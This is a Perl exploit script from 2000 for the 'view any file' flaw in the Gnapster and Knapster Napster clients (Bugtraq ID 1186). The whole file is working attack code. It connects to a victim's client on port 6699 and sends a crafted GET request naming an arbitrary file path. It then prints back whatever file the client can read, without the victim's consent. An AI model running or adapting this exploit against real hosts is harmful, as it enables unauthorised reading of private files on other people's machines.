#!/usr/bin/perl       

######################################################################## 
#                                                                      #
#             Gnapster / Knapster "view any file" exploit              #
#                                                                      #
#  This script was originally written by no_maam on May the 13th 2000  #
#  and modified by Dennis (conrad.d@web.de) on May the 14th.           #
#                                                                      #
#  It exploits a bug in Gnapster prior to 1.3.9 discovered by          #
#  Jim Early on May the 10th 2000 and a bug in Knapster up to 0.10     #
#  discovered by Tom Daniels on May the 10th 2000.                     #
#  Due to a design error in Gnapster and Knapster it's possible to     #
#  view any file Gnapster / Knapster has access to because the         #
#  application fails to check that the requested file is an            #
#  explicitly shared MP3 file before providing it.                     #
#                                                                      #
#  NOTE: Both clients crashed very often while testing this script!    #
#                                                                      #
#  See Bugtraq ID 1186 at http://www.securityfocus.com for details.    #
#                                                                      #
#                     Standard disclaimer applies.                     #
#                                                                      #
######################################################################## 

use IO::Socket;

unless (@ARGV >= 2) {
    &args
}                                                                      

print " .: Gnapster / Knapster \"view any file\" exploit by no_maam and Dennis Conrad :.\n\n";

$host = $ARGV[0];
$file = $ARGV[1];
$file =~ s/\//\\/g; # Replace any / in filename with \                 

if ($ARGV[2] == "") {     #
    $port = 6699          # Use port 6699                              
} elsif ($ARGV[2] != ""){ # if none specified
    $port = $ARGV[2]      #                                            
}                     

if ($ARGV[3] eq "") {     #
    $name = "nobody"      # Use name "nobody"
} elsif ($ARGV[3] ne ""){ # if none specified
    $name = $ARGV[3]      #
}
    
$remote = IO::Socket::INET->new( Proto => "tcp",                       
                                 PeerAddr => $host,
                                 PeerPort => $port
                               ) || die " Couldn't open port $port on
$host\n";

$remote->autoflush(1);

sleep 2; # Wait two seconds (slow connection)

print $remote "GET$name \"$file\" 0\n"; # Get the file                 

while (<$remote>) {
    if ($_ =~ /FILE NOT FOUND/) { # Test is file exists
        print " File $file not found or the client has no permission so access it.\n";
        exit 1 # Return exit status 0 (for shellscripts)
    }
    
    if ($_ =~ /NOT SHARED/) { # Test for fixed version of Gnapster / Knapster
        print " Sorry, this is a fixed client\n";                      
        exit 1                   
    }                            
                               
    push @output, $_ # Write file to @output
}

print "\n@output\n"; # Print @output to STDOUT

close $remote;

exit 0;

sub args { 
    print " Usage: $0 <host> <file> [port] [name]\n"; 
    print " By default port 6699 and name \"nobody\" is used.\n";
    exit 1 
}   
    
# EOF
